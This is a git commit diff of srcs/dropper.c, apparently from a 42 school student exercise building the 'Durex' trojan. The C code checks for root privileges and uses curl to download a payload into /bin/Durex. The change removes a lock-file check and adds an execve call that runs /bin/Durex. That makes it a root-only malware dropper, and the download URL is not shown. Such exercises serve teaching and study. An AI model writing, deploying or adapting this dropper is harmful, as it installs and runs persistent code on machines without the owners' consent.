4ff9a1bf42449ae7c0536f5a0b2688a853e2b69f
Jeremy CAMHI <jcamhi@student.42.fr>
2019-05-02 17:00:58 +0200

    Automatic commit

--- srcs/dropper.c
+++ srcs/dropper.c
@@ -18,21 +18,17 @@ size_t write_data(void *buffer, size_t size, size_t nmemb, void *fd_data)
 int		main()
 {
 	int fd;
-	int fd_lock;
 	CURL *handler;
 
 	if (getuid() != 0)
 		return (0);
 
-	fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
-	if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
-		return (3);
-	flock(fd_lock, LOCK_UN);
-
-
 	fd = open("/bin/Durex", O_CREAT | O_WRONLY | O_TRUNC, 0700);
 	if (fd == -1)
-		return (0);
+	{
+		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
+		return (1);
+	}
 
 	handler = curl_easy_init();
 	if (handler)
